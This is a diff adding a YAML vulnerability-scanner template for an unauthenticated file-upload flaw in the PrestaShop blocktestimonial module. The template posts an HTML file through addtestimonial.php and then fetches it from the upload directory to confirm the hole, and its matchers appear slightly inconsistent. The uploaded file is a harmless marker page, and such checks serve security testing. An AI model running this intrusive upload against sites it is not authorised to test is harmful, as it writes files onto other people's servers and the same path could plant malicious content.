@@ -1,0 +1,71 @@
+id: prestashop-blocktestimonial-file-upload
+brief:
+    title: Prestashop Blocktestimonial Modules - File Upload Vulnerability
+    by: MaStErChO
+    level: critical
+    about: ""
+    label:
+        - intrusive
+        - file-upload
+        - blocktestimonial
+        - prestashop
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/modules/blocktestimonial/addtestimonial.php'
+      head:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+      body: |-
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_submitter_name"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_title"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_main_message"
+
+        {{data}}
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial_img"; filename="{{filename}}.html"
+        Content-Type: text/html
+
+        <html>
+        <body>
+        <h1>{{data}}</h1>
+        </body>
+        </html>
+
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
+        Content-Disposition: form-data; name="testimonial"
+
+        Submit Testimonial
+        ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl--
+      signs:
+        - "on": word
+          has:
+            - Your testimonial was submitted successfully.
+          in: body_1
+          need: all
+        - "on": word
+          has:
+            - '{{data}}'
+          in: body_2
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/upload/{{filename}}.html'
+      signs:
+        - "on": word
+          has:
+            - Your testimonial was submitted successfully.
+          in: body_1
+          need: all
+        - "on": word
+          has:
+            - '{{data}}'
+          in: body_2
+          need: all
